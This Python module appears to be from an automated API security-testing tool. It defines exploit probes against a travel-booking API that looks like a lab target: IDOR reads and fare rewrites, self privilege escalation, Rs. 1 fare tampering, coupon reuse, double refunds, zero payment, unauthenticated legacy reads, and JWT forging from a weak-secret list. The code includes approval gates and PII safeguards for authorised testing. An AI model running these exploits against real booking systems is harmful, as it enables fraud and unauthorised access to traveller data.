"""Specialist Executors — one per vulnerability class.

Each executor runs ONE targeted test (chosen by the Attack Planner) and
returns a *candidate* finding — never a final verdict. The Verifier
re-checks every candidate with a minimal proof before it becomes a finding.

Rules every executor follows:
  * Minimal requests — one probe, plus the smallest setup the test needs
    (e.g. a hold before a booking). No spraying, no bulk reads.
  * Minimal evidence — evidence strings name booking ids and counts only.
    Traveller names and passport numbers are NEVER copied into evidence.
  * Risky tests (fare tampering, privilege escalation) ask the approval
    gate first; without approval they return "skipped", not a finding.
  * State changes are cleaned up where possible (the privilege-escalation
    test restores the victim's role in the Verifier).

A candidate is a dict: {"test_id", "title", "class", "endpoint",
"evidence": [...], "raw": {...}} — "raw" holds the ids the Verifier needs
to re-run the proof, and nothing else.
"""

import base64
import hashlib
import hmac
import json
import time

# Small weak-secret list for the forged-JWT test. These are the guesses any
# attacker would try first; "travel123" is the planted secret.
WEAK_SECRETS = ["secret", "travel123", "changeme", "password", "astratravel"]


def _fresh_booking(client, account: str, total=None):
    """Hold a seat and book it. Returns the booking dict."""
    _, hold = client.post("/bookings/hold", {"flight_id": "AI-302",
                                             "travellers": 2},
                          token=client.login(account), account=account,
                          note="setup: hold a seat")
    body = {"hold_id": hold["hold_id"]}
    if total is not None:
        body["total"] = total
    status, booking = client.post("/bookings", body,
                                  token=client.login(account),
                                  account=account, note="setup: book")
    assert status == 200, f"setup booking failed: {booking}"
    return booking


def _forge_token(secret: str, username="platform_admin", agency=None,
                 role="platform_admin") -> str:
    """Mint a JWT with a guessed secret (no password needed)."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({
        "sub": username, "agency_id": agency, "role": role,
        "exp": int(time.time()) + 3600,
    }).encode()).rstrip(b"=").decode()
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(),
                   hashlib.sha256).digest()
    return f"{header}.{payload}." + base64.urlsafe_b64encode(
        sig).rstrip(b"=").decode()


# -- access control ------------------------------------------------------

def idor_read(client, session, gate):
    """SkyWays agent reads a GlobeTrek booking by id."""
    bid = session["globe_booking_id"]
    status, data = client.get(f"/bookings/{bid}",
                              token=client.login("sky_agent1"),
                              account="sky_agent1", note="IDOR probe")
    if status == 200 and data.get("agency_id") == "ag_globetrek" \
            and data.get("travellers"):
        return {"test_id": "idor-read", "title": "Cross-agency booking read (IDOR)",
                "class": "access-control", "endpoint": "GET /bookings/{id}",
                "evidence": [
                    f"sky_agent1 (ag_skyways) GET /bookings/{bid} -> 200",
                    f"Response agency_id=ag_globetrek, "
                    f"{len(data['travellers'])} travellers returned "
                    f"(names/passports withheld from evidence)"],
                "raw": {"booking_id": bid}}
    return None


def privilege_escalation(client, session, gate):
    """A sub-agent promotes herself to agency_admin. RISKY — needs approval."""
    if not gate.check("privilege-escalation",
                      "sub-agent promotes self to agency_admin"):
        return {"test_id": "privilege-escalation", "skipped": True,
                "reason": "awaiting human approval"}
    status, data = client.post(
        "/admin/users/sky_agent2/role", {"role": "agency_admin"},
        token=client.login("sky_agent2"), account="sky_agent2",
        note="privilege-escalation probe")
    if status == 200 and data.get("role") == "agency_admin":
        return {"test_id": "privilege-escalation",
                "title": "Sub-agent promotes self to agency_admin",
                "class": "access-control",
                "endpoint": "POST /admin/users/{id}/role",
                "evidence": [
                    "sky_agent2 (sub_agent) POST "
                    "/admin/users/sky_agent2/role {role: agency_admin} -> 200",
                    "Response role=agency_admin — the endpoint never "
                    "checked the caller's role"],
                "raw": {"username": "sky_agent2"}}
    return None


def fare_modify_idor(client, session, gate):
    """SkyWays agent rewrites a GlobeTrek booking's fare (v2.4.0 endpoint)."""
    bid = session["globe_booking_id"]
    status, data = client.post(
        f"/v2/bookings/{bid}/fare-modify", {"new_fare": 5},
        token=client.login("sky_agent1"), account="sky_agent1",
        note="fresh-IDOR probe on the new endpoint")
    if status == 200 and data.get("fare") == 5:
        return {"test_id": "fare-modify-idor",
                "title": "Cross-agency fare rewrite (fresh IDOR, v2.4.0)",
                "class": "access-control",
                "endpoint": "POST /v2/bookings/{id}/fare-modify",
                "evidence": [
                    f"sky_agent1 (ag_skyways) POST /v2/bookings/{bid}/"
                    f"fare-modify {{new_fare: 5}} -> 200",
                    "Response fare=5 on a GlobeTrek booking — no "
                    "agency-ownership check on the new endpoint"],
                "raw": {"booking_id": bid}}
    return None


# -- business logic ------------------------------------------------------

def fare_tampering(client, session, gate):
    """Book a flight for Rs. 1 by sending a client-supplied total.
    RISKY — it creates a booking with a falsified price."""
    if not gate.check("fare-tampering",
                      "book a flight with a client-supplied total of Rs. 1"):
        return {"test_id": "fare-tampering", "skipped": True,
                "reason": "awaiting human approval"}
    booking = _fresh_booking(client, "sky_agent1", total=1)
    if booking.get("total") == 1:
        return {"test_id": "fare-tampering",
                "title": "Book at Rs. 1 (fare tampering)",
                "class": "business-logic", "endpoint": "POST /bookings",
                "evidence": [
                    f"POST /bookings {{hold_id, total: 1}} -> 200, "
                    f"booking {booking['id']} created with total=1",
                    "Server trusted the client-supplied total instead of "
                    "recomputing the fare"],
                "raw": {"booking_id": booking["id"]}}
    return None


def coupon_reuse(client, session, gate):
    """Apply the single-use coupon FLY10 twice to the same booking."""
    booking = _fresh_booking(client, "sky_agent1")
    bid = booking["id"]
    token = client.login("sky_agent1")
    s1, r1 = client.post("/coupons/apply",
                         {"code": "FLY10", "booking_id": bid},
                         token=token, account="sky_agent1",
                         note="coupon probe, 1st use")
    s2, r2 = client.post("/coupons/apply",
                         {"code": "FLY10", "booking_id": bid},
                         token=token, account="sky_agent1",
                         note="coupon probe, 2nd use (must fail if single-use)")
    if s1 == 200 and s2 == 200 and r2.get("times_applied") == 2:
        return {"test_id": "coupon-reuse",
                "title": "Single-use coupon applied twice",
                "class": "business-logic", "endpoint": "POST /coupons/apply",
                "evidence": [
                    f"FLY10 applied to {bid}: 1st use -> total "
                    f"{r1.get('new_total')}, 2nd use -> total "
                    f"{r2.get('new_total')}, times_applied=2",
                    "Single-use coupon was never marked used"],
                "raw": {"booking_id": bid}}
    return None


def double_refund(client, session, gate):
    """Pay for a booking, then cancel it twice — refunded twice."""
    booking = _fresh_booking(client, "sky_agent1")
    bid = booking["id"]
    token = client.login("sky_agent1")
    client.post(f"/bookings/{bid}/pay",
                {"amount": booking["total"], "method": "card"},
                token=token, account="sky_agent1", note="setup: pay in full")
    _, c1 = client.post(f"/bookings/{bid}/cancel",
                        {"reason": "traveller request"}, token=token,
                        account="sky_agent1", note="refund probe, 1st cancel")
    _, c2 = client.post(f"/bookings/{bid}/cancel",
                        {"reason": "traveller request"}, token=token,
                        account="sky_agent1",
                        note="refund probe, 2nd cancel (must not refund again)")
    if c1.get("refunds_issued") == 1 and c2.get("refunds_issued") == 2:
        return {"test_id": "double-refund",
                "title": "Cancel twice, refunded twice",
                "class": "business-logic",
                "endpoint": "POST /bookings/{id}/cancel",
                "evidence": [
                    f"Booking {bid} (total {booking['total']}): 1st cancel "
                    f"-> refunds_issued=1, 2nd cancel -> refunds_issued=2",
                    "The endpoint never checks whether a refund was already "
                    "issued"],
                "raw": {"booking_id": bid}}
    return None


def pay_zero(client, session, gate):
    """Pay Rs. 0 for a booking — it is still marked PAID (bonus finding)."""
    booking = _fresh_booking(client, "sky_agent1")
    bid = booking["id"]
    status, data = client.post(
        f"/bookings/{bid}/pay", {"amount": 0, "method": "card"},
        token=client.login("sky_agent1"), account="sky_agent1",
        note="skipped-payment probe")
    if status == 200 and data.get("status") == "PAID" \
            and data.get("paid_amount") == 0:
        return {"test_id": "pay-zero",
                "title": "Pay Rs. 0 marks booking PAID (bonus)",
                "class": "business-logic",
                "endpoint": "POST /bookings/{id}/pay",
                "evidence": [
                    f"POST /bookings/{bid}/pay {{amount: 0}} -> 200, "
                    f"status=PAID, paid_amount=0",
                    "The endpoint never checks the amount against the total"],
                "raw": {"booking_id": bid}}
    return None


# -- zombie / shadow ------------------------------------------------------

def zombie_unauth(client, session, gate):
    """Call the legacy v1 booking lookup with NO token at all."""
    bid = session["globe_booking_id"]
    status, data = client.get(f"/v1/bookings/{bid}", account="anonymous",
                              note="zombie probe, no token")
    if status == 200 and data.get("travellers"):
        return {"test_id": "zombie-unauth",
                "title": "Zombie API serves PII without auth",
                "class": "zombie-api", "endpoint": "GET /v1/bookings/{id}",
                "evidence": [
                    f"GET /v1/bookings/{bid} with NO token -> 200",
                    f"Full booking returned, {len(data['travellers'])} "
                    f"travellers with PII (withheld from evidence)"],
                "raw": {"booking_id": bid}}
    return None


def shadow_undocumented(client, session, gate):
    """Call the undocumented supplier-sync route with a sub-agent token."""
    status, data = client.post(
        "/internal/supplier-sync",
        {"supplier": "amadeus", "inventory": ["AI-302"]},
        token=client.login("sky_agent1"), account="sky_agent1",
        note="shadow probe")
    if status == 200 and data.get("status") == "synced":
        return {"test_id": "shadow-undocumented",
                "title": "Shadow API accepts calls with no authorisation check",
                "class": "shadow-api",
                "endpoint": "POST /internal/supplier-sync",
                "evidence": [
                    "POST /internal/supplier-sync as sky_agent1 "
                    "(sub_agent) -> 200, status=synced",
                    "Route is undocumented, never in the discovered map, "
                    "yet performs no authorisation beyond 'has a token'"],
                "raw": {}}
    return None


# -- auth -----------------------------------------------------------------

def forged_jwt(client, session, gate):
    """Forge a platform_admin token with a guessed weak secret."""
    bid = session["globe_booking_id"]
    for secret in WEAK_SECRETS:
        token = _forge_token(secret)
        status, _ = client.get(f"/bookings/{bid}", token=token,
                               account="forged-token",
                               note=f"forged-JWT probe (secret guess)")
        if status == 200:
            return {"test_id": "forged-jwt",
                    "title": "Forged JWT accepted (weak secret)",
                    "class": "auth", "endpoint": "GET /bookings/{id}",
                    "evidence": [
                        f"A token minted with secret {secret!r} for "
                        f"platform_admin was accepted (200)",
                        "Anyone who guesses the weak secret can mint any "
                        "identity — no password needed"],
                    "raw": {"secret": secret}}
    return None


# -- API hygiene ----------------------------------------------------------

def no_rate_limit(client, session, gate):
    """Send a small burst of bad logins and watch for a 429."""
    attempts = 20
    codes = []
    for _ in range(attempts):
        status, _ = client.post(
            "/auth/login",
            {"username": "sky_agent1", "password": "wrong"},
            account="rate-limit-probe", note="bad login, rate-limit probe")
        codes.append(status)
    if 429 not in codes and all(c == 401 for c in codes):
        return {"test_id": "no-rate-limit",
                "title": "No rate limiting on login",
                "class": "api-hygiene", "endpoint": "POST /auth/login",
                "evidence": [
                    f"{attempts} failed logins in a row: statuses "
                    f"{sorted(set(codes))}, no 429 anywhere",
                    "Unlimited guessing is possible — no throttling, "
                    "no lockout"],
                "raw": {"attempts": attempts, "statuses": codes}}
    return None


# -- controls (correct behaviour — must NOT become findings) --------------

def control_list_filter(client, session, gate):
    """Listing another agency's bookings must return 403."""
    status, _ = client.get("/bookings?agency_id=ag_globetrek",
                           token=client.login("sky_agent1"),
                           account="sky_agent1", note="control check")
    return {"test_id": "control-list-filter", "control": True,
            "passed": status == 403,
            "detail": f"sky_agent1 listing ag_globetrek -> {status} "
                      f"(expected 403)"}


def control_search_auth(client, session, gate):
    """Search must work logged in (200) and fail anonymously (401)."""
    s1, r1 = client.get("/search/flights?from=DEL&to=BOM",
                        token=client.login("sky_agent1"),
                        account="sky_agent1", note="control check")
    s2, _ = client.get("/search/flights?from=DEL&to=BOM",
                       account="anonymous", note="control check, no token")
    passed = s1 == 200 and len(r1.get("results", [])) > 0 and s2 == 401
    return {"test_id": "control-search-auth", "control": True,
            "passed": passed,
            "detail": f"logged-in {s1} ({len(r1.get('results', []))} "
                      f"results), anonymous {s2} (expected 401)"}


EXECUTORS = {
    "idor_read": idor_read,
    "privilege_escalation": privilege_escalation,
    "fare_modify_idor": fare_modify_idor,
    "fare_tampering": fare_tampering,
    "coupon_reuse": coupon_reuse,
    "double_refund": double_refund,
    "pay_zero": pay_zero,
    "zombie_unauth": zombie_unauth,
    "shadow_undocumented": shadow_undocumented,
    "forged_jwt": forged_jwt,
    "no_rate_limit": no_rate_limit,
    "control_list_filter": control_list_filter,
    "control_search_auth": control_search_auth,
}
